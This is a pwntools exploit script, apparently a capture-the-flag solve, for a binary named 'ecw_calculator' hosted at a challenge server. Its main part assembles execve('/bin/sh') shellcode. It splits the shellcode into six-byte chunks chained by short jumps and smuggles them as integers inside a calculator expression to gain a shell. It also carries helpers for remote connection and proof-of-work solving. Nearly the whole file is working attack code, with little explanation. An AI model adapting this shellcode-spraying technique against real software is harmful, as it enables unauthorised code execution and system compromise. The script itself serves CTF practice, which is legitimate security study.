from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./ecw_calculator"
exe_args = []
io: process = None
PREFIX = b"> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    conn = "challenges.challenge-ecw.eu 35113"
    conn = conn.split(" ")
    io = remote(conn[0], conn[1])

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

payload = b""

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    payload = b"plus 65 plus 0 plus 0 plus plus 0 plus 0 plus a 3942645761 plus plus plus plus "

    code = """
mov rsp, r8
xor eax, eax
mov ebx, 0x0068732f
shl rbx, 32
mov ecx, 0x6e69622f
or rbx, rcx
push rbx
mov rdi, rsp
xor esi, esi
xor edx, edx
push 0x3b   
pop rax
syscall
"""
    code = code.splitlines()

    ints = []
    i = 0
    while i < len(code):
        p = b""
        j = i
        k = 0
        while j < len(code):
            tmp = p
            tmp += asm(code[j])
            print(code[j])
            if len(tmp) > 6:
                break
            p = tmp
            j += 1
            k += 1
        p = p.ljust(6, b"\x90")
        ints.append(u64(p))
        i += k

    print(ints)

    payload += b"plus " * len(ints)
    payload += b"-1 -1 -1 -1 -1 "
    payload += b" ".join([str((0x05eb << 48) | i).encode() for i in ints])

    success("payload: " + payload.decode())
    exit()

    io.interactive()
    input("end")
    exit()

# launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        print(payload)
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)
